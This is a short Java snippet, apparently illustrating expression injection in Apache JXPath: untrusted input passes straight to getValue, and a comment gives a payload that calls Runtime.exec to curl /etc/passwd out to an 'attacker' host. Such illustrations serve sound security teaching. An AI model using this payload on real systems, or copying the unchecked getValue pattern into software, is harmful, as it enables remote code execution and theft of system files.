JXPathContext context = JXPathContext.newContext(someObject);
Object result = context.getValue(userPath);
// Payload: java.lang.Runtime.getRuntime().exec("curl http://attacker/$(cat /etc/passwd)")
